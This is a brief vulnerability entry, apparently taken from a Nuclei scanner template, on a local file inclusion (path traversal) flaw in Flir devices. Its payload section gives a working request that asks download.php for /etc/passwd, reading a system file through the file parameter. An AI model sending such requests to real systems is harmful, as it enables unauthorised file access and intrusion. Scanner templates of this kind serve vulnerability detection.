# Vulnerability: Flir - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`flir-path-traversal.yaml`)

## Description
Flir is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/download.php?file=/etc/passwd
```

